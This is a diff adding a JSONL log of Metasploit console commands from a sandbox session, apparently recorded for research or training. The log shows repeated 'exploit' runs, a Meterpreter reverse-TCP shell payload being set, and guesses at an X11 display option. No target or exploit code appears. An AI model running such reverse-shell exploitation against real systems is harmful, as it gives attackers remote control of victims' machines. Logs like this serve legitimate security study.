@@ -1,0 +1,10 @@
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:05:34.062871Z", "cmd_type": "msf-command", "cmd": "edit"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:05:38.775265Z", "cmd_type": "msf-command", "cmd": "reload"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:05:50.507364Z", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:06:03.336010Z", "cmd_type": "msf-command", "cmd": "set payload linux/x64/meterpreter/reverse_tcp "}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:06:15.933726Z", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:06:24.967859Z", "cmd_type": "msf-command", "cmd": "set XDISPLAY "}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:06:27.785714Z", "cmd_type": "msf-command", "cmd": "set XDISPLAY 1"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:06:52.740549Z", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:07:48.020018Z", "cmd_type": "msf-command", "cmd": "set XDISPLAY 10:0"}
+{"sandbox_id": "399", "timestamp_str": "2019-08-14T16:07:59.309875Z", "cmd_type": "msf-command", "cmd": "exploit"}
